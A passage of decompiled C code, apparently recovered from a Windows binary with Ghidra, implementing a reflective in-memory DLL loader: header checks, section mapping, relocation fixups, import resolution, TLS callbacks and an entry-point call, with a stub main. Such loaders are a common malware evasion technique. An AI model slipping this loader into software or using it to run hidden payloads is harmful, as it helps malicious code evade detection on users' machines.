  int local_18 = FUN_0040264f(param_1, iVar1);
  uint local_14 = *(uint *)(iVar1 + 0x24);
  
  iVar2 = *param_1;
  param_1 = (int *)1;
  if (1 < *(ushort *)(iVar2 + 6)) {
    do {
      uint local_8 = *(uint *)(iVar1 + 0x30);
      uint uVar5 = ~(piVar3[0xe] - 1U) & local_8;
      int local_c = FUN_0040264f(piVar3, iVar1 + 0x28);
      if ((local_1c == uVar5) || (uVar5 < (uint)(local_18 + local_20))) {
        uVar5 = *(uint *)(iVar1 + 0x4c);
        local_14 = (uVar5 | local_14);
        local_18 = (local_c - local_20) + local_8;
      } else {
        if (!FUN_0040267b(piVar3, (int *)&local_20)) {
          return 0;
        }
        local_20 = local_8;
        local_18 = local_c;
        local_14 = *(uint *)(iVar1 + 0x4c);
        local_1c = uVar5;
      }
      param_1 = (int *)((intptr_t)param_1 + 1);
      iVar1 = iVar1 + 0x28;
    } while ((intptr_t)param_1 < (intptr_t)*(ushort *)(*piVar3 + 6));
  }
  return FUN_0040267b(piVar3, (int *)&local_20);
}

typedef int (*TlsCallback_t)(int, int, int);

undefined4 __cdecl FUN_0040271d(int *param_1) {
  int iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xc0) == 0) {
    return 1;
  }
  uintptr_t *puVar2 = *(uintptr_t **)(*(int *)(*param_1 + 0xc0) + 0xc + iVar1);
  if (puVar2 != NULL) {
    for (; *puVar2 != 0; puVar2++) {
      TlsCallback_t pCallback = (TlsCallback_t)*puVar2;
      pCallback(iVar1, 1, 0);
    }
  }
  return 1;
}

bool __cdecl FUN_00402758(int *param_1, int param_2) {
  int iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xa4) == 0) {
    return param_2 == 0;
  } else {
    int *piVar3 = (int *)(*(int *)(*param_1 + 0xa0) + iVar1);
    int iVar2 = *piVar3;
    while (iVar2 != 0) {
      int idx = 0;
      ushort *puVar5 = (ushort *)(piVar3 + 2);
      if ((piVar3[1] - 8U & 0xfffffffe) != 0) {
        do {
          if ((*puVar5 & 0xf000) == 0x3000) {
            int *piVar4 = (int *)((*puVar5 & 0xfff) + iVar2 + iVar1);
            *piVar4 = *piVar4 + param_2;
          }
          idx++;
          puVar5 = puVar5 + 1;
        } while (idx < (int)(piVar3[1] - 8U >> 1));
      }
      piVar3 = (int *)((intptr_t)piVar3 + piVar3[1]);
      iVar2 = *piVar3;
    }
    return 1;
  }
}

void FUN_004029cc(int *param_1) {
  if (param_1) HeapFree(GetProcessHeap(), 0, param_1);
}

typedef FARPROC (*GetProcAddress_t)(HMODULE, LPCSTR, int);

int __cdecl FUN_004027df(uint *param_1) {
  uint uVar1;
  uint *puVar2;
  int iVar3;
  HMODULE pvVar4;
  uint uVar5;
  int *lp;
  GetProcAddress_t pGetProcAddress = (GetProcAddress_t)(uintptr_t)param_1[10];

  if (*(int *)(*param_1 + 0x80) != 0) {
    lp = (int *)(*(int *)(*param_1 + 0x80) + param_1[1]);
    while (lp[3] != 0) {
      pvVar4 = LoadLibraryA((char *)(lp[3] + param_1[1]));
      if (pvVar4 == NULL) return 0;
      
      uVar1 = lp[0] ? lp[0] : lp[4];
      puVar2 = (uint *)(uVar1 + param_1[1]);
      
      while (*puVar2 != 0) {
        if ((*puVar2 & 0x80000000) == 0) {
          uVar5 = *puVar2 + param_1[1] + 2;
        } else {
          uVar5 = *puVar2 & 0xffff;
        }
        if (pGetProcAddress) {
          iVar3 = (int)(uintptr_t)pGetProcAddress(pvVar4, (LPCSTR)(uintptr_t)uVar5, 0);
          if (iVar3 == 0) return 0;
          *puVar2 = iVar3;
        }
        puVar2++;
      }
      lp += 5;
    }
  }
  return 1;
}

typedef uintptr_t (*AllocCode_t)(uintptr_t, uint, DWORD, DWORD, uintptr_t);
typedef FARPROC (*GetProc_t)(HMODULE, LPCSTR, int);
typedef int (*DllEntry_t)(uintptr_t, int, int);

uint * __cdecl FUN_004021e9(short *param_1, uint param_2, undefined *param_3, undefined *param_4, uint param_5, undefined *param_6, uint param_7, uint param_8) {
  bool bVar1;
  int iVar2;
  HMODULE pHVar3;
  uint uVar5;
  HANDLE hHeap;
  uint *puVar6;
  void *_Dst;
  int *piVar7;
  uint uVar8;
  int *piVar9;
  DWORD DVar10;
  SIZE_T dwBytes;
  uint local_28 = 4096;
  uint local_8 = 0;

  iVar2 = FUN_00402457(param_2, 0x40);
  if (iVar2 == 0) return NULL;

  if (*param_1 == 0x5a4d) {
    iVar2 = FUN_00402457(param_2, *(int *)(param_1 + 0x1e) + 0xf8);
    if (iVar2 == 0) return NULL;

    piVar9 = (int *)(*(int *)(param_1 + 0x1e) + (char *)param_1);
    if (((*piVar9 == 0x4550) && ((short)piVar9[1] == 0x14c)) && ((piVar9[0xe] & 1U) == 0)) {
      uVar8 = (uint)*(ushort *)((char *)piVar9 + 6);
      if (uVar8 != 0) {
        piVar7 = (int *)((char *)piVar9 + *(ushort *)(piVar9 + 5) + 0x24);
        do {
          uVar5 = piVar7[1];
          if (uVar5 == 0) uVar5 = piVar9[0xe];
          if (local_8 < *piVar7 + uVar5) local_8 = *piVar7 + uVar5;
          piVar7 = piVar7 + 10;
          uVar8 = uVar8 - 1;
        } while (uVar8 != 0);
      }
      pHVar3 = GetModuleHandleA(s_kernel32_dll_0040ebe8);
      if (pHVar3 == NULL) return NULL;

      GetProc_t pGetProc = (GetProc_t)(uintptr_t)param_6;
      FARPROC pcVar4 = pGetProc ? pGetProc(pHVar3, s_GetNativeSystemInfo_0040f55c, 0) : NULL;
      if (pcVar4 == NULL) return NULL;

      uVar8 = (piVar9[0x14] + local_28 - 1) & ~(local_28 - 1);
      AllocCode_t pAlloc = (AllocCode_t)(uintptr_t)param_3;
      uVar5 = pAlloc ? (uint)pAlloc(piVar9[0xd], uVar8, 0x3000, 4, param_8) : 0;
      if (uVar5 == 0 && pAlloc) {
        uVar5 = (uint)pAlloc(0, uVar8, 0x3000, 4, param_8);
      }

      if (uVar5 != 0) {
        dwBytes = 0x3c;
        DVar10 = 8;
        hHeap = GetProcessHeap();
        puVar6 = (uint *)HeapAlloc(hHeap, DVar10, dwBytes);
        if (puVar6 != NULL) {
          puVar6[1] = uVar5;
          puVar6[5] = (*(ushort *)((char *)piVar9 + 0x16) & 0x2000) >> 0xd;
          puVar6[7] = (uint)(uintptr_t)param_3;
          puVar6[8] = (uint)(uintptr_t)param_4;
          puVar6[9] = param_5;
          puVar6[10] = (uint)(uintptr_t)param_6;
          puVar6[0xb] = param_7;
          puVar6[0xc] = param_8;
          puVar6[0xe] = local_28;

          iVar2 = FUN_00402457(param_2, piVar9[0x15]);
          if (iVar2 != 0) {
            _Dst = (void *)(uintptr_t)(pAlloc ? pAlloc(uVar5, piVar9[0x15], 0x1000, 4, param_8) : 0);
            if (_Dst) {
              memcpy(_Dst, param_1, piVar9[0x15]);
              iVar2 = *(int *)(param_1 + 0x1e);
              *puVar6 = iVar2 + (uint)(uintptr_t)_Dst;
              *(uint *)(iVar2 + (char *)_Dst + 0x34) = uVar5;
              iVar2 = FUN_00402470((int)(uintptr_t)param_1, param_2, (int)(uintptr_t)piVar9, (int *)puVar6);
              if (iVar2 != 0) {
                iVar2 = *(int *)(*puVar6 + 0x34) - piVar9[0xd];
                if (iVar2 == 0) {
                  puVar6[6] = 1;
                } else {
                  bVar1 = FUN_00402758((int *)puVar6, iVar2);
                  puVar6[6] = bVar1;
                }
                iVar2 = FUN_004027df(puVar6);
                if ((iVar2 != 0) && FUN_0040254b((int *)puVar6) && FUN_0040271d((int *)puVar6)) {
                  iVar2 = *(int *)(*puVar6 + 0x28);
                  if (iVar2 == 0) {
                    puVar6[0xd] = 0;
                    return puVar6;
                  }
                  if (puVar6[5] == 0) {
                    puVar6[0xd] = iVar2 + uVar5;
                    return puVar6;
                  }
                  DllEntry_t pDllEntry = (DllEntry_t)(uintptr_t)(iVar2 + uVar5);
                  if (pDllEntry(uVar5, 1, 0)) {
                    puVar6[4] = 1;
                    return puVar6;
                  }
                  SetLastError(0x45a);
                }
              }
            }
          }
          FUN_004029cc((int *)puVar6);
          return NULL;
        }
      }
    }
  }
  return NULL;
}

void __cdecl FUN_004021bd(short *param_1, uint param_2) {
  FUN_004021e9(param_1, param_2, &LAB_0040216e, &LAB_00402185, 0x402198, &LAB_004021a3, 0x4021b2, 0);
}

int main(void) {
  /* Punto de entrada para prueba de compilacion */
  return 0;
}